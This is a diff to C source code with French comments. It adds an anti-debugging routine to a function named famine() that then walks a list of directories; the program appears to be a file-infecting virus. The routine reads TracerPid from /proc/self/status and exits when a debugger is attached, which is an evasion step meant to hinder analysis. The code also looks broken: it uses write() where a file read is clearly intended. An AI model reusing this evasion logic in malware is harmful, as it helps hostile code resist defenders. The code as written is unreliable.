@@ -14,6 +14,43 @@
 
 #define BUFF_SIZE 0x1000
 
+void check_debugger() {
+    long ret, fd, bytes_read;
+    char buffer[512];
+    const char *path = "/proc/self/status";
+    const char tracer_pid_key[] = "TracerPid:";
+
+    // Ouvrir le fichier /proc/self/status
+    open(fd, path, O_RDONLY);
+    if (fd < 0) {
+        // Si le fichier ne peut pas être ouvert, continuer sans rien faire
+        return;
+    }
+
+    // Lire le contenu du fichier
+    write(bytes_read, fd, buffer, sizeof(buffer) - 1);
+    if (bytes_read > 0) {
+        buffer[bytes_read] = '\0'; // Terminer la chaîne pour la recherche
+        const char *found = buffer;
+        while ((found = ft_strstr(found, tracer_pid_key))) {
+            found += sizeof(tracer_pid_key) - 1;
+            while (*found == ' ' || *found == '\t') found++; // Ignorer les espaces
+            if (*found > '0' && *found <= '9') {
+                // Débogueur détecté
+                const char msg[] = "Debugger detected! Exiting...\n";
+                write(ret, 1, msg, sizeof(msg) - 1);
+                close(fd);
+                exit(1);
+            }
+        }
+    }
+
+    // Fermer le fichier
+    close(fd);
+}
+
+
+
 void famine() {
 	byte		*start_rip;
 	get_rip(start_rip);
@@ -33,6 +70,16 @@ void famine() {
 	(void)this;
 
 	write(ret, 1, &string, sizeof(uint64_t));
+	write(ret, 1, "\n", 1);
+
+	check_debugger();
+	// long test = 0;
+	// ptrace(test, 0, 0, 0, 0); // Si échec, un débogueur est attaché
+    // if (ret < 0) {
+    //     const char msg[] = "Debugger detected! Exiting...\n";
+    //     write(ret, 1, msg, sizeof(msg) - 1);
+    //     exit(1);
+    // }
 
 	for (int dir_index = 0; directories[dir_index]; dir_index += 2) {
 		str	dir_name = (str)&directories[dir_index];
